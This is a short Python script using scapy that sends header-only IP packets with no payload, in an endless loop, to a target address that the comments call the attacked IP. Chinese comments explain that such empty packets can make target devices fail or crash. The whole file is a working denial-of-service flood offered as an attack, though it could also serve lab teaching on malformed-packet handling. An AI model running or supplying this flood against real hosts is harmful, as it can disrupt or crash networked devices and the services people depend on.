# -*- coding:utf-8 -*-
from scapy.all import *
pkt=IP(dst='192.168.1.2')    #192.168.1.2为被攻击IP    
while True:
	send(pkt)
	

	
# 如果IP报文只有20字节的IP报文头，没有数据部分，就认为是没有IP载荷的报文。
# 攻击者经常构造只有IP头部，没有携带任何高层数据的IP报文，目标设备在处理这些没有IP载荷的报文时会出错和崩溃。
